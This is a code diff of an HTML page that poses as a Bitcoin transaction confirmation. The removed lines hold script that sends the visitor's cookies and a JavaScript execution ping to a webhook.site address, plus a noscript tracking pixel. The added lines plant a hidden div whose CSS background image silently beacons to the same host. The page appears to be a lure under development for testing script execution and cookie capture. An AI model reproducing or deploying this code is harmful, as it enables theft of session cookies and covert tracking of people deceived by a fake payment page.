@@ -7,16 +7,11 @@
     <h1>Transaction Hash: 1234567890abcdef...</h1>
     <p>Amount: 100 BTC ✅</p>
 
-    <script>
-        // Просто отправляем сигнал, что страница загружена и JS работает
-        new Image().src = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?js_executed=true';
-        
-        // Попытка получить куки
-        new Image().src = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?cookies=' + encodeURIComponent(document.cookie);
-    </script>
+    <div id="tracker" style="display:none;"></div>
     
-    <noscript>
-        <img src="https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394?noscript=true" width="1" height="1">
-    </noscript>
+    <script>
+        var div = document.getElementById('tracker');
+        div.style.backgroundImage = 'url(https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394/css_ping)';
+    </script>
 </body>
 </html>
